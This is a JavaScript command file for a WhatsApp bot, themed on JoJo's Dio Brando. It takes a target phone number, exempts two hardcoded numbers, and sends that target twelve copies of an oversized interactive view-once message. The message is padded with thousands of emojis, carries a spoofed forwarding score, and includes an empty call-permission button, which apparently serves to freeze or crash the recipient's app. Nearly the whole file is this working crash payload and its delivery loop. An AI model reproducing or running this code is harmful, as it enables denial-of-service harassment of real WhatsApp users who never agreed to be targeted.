// commands/dio.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function dioCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "⏰ *Dio Brando*\n\nUsage: .dio <number>\nExample: .dio 628123456789\n\n*Za Warudo! Toki yo tomare!*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Jonathan Joestar*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `⏰ *ZA WARUDO!* Time stopping for ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "⏰", key: message.key } });

    try {
        const zaWarudoPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        body: { text: "✦ Ḍīǿ Ḃṛȧṅḋǿ ✦" + "⏰".repeat(4500) },
                        footer: { text: "ZA WARUDO" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "MUDA MUDA MUDA!", id: "muda" }) },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "WRYYYYY", url: "https://youtu.be/dQw4w9WgXcQ" }) }
                            ]
                        }
                    }
                }
            }
        };

        for (let i = 0; i < 12; i++) {
            await sock.relayMessage(target, zaWarudoPayload, { participant: { jid: target } });
        }
        
        await sock.sendMessage(chatId, { text: `✅ *ZA WARUDO* stopped time for ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🕰️", key: message.key } });

    } catch (error) {
        console.error('[Dio]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *ZA WARUDO failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = dioCommand;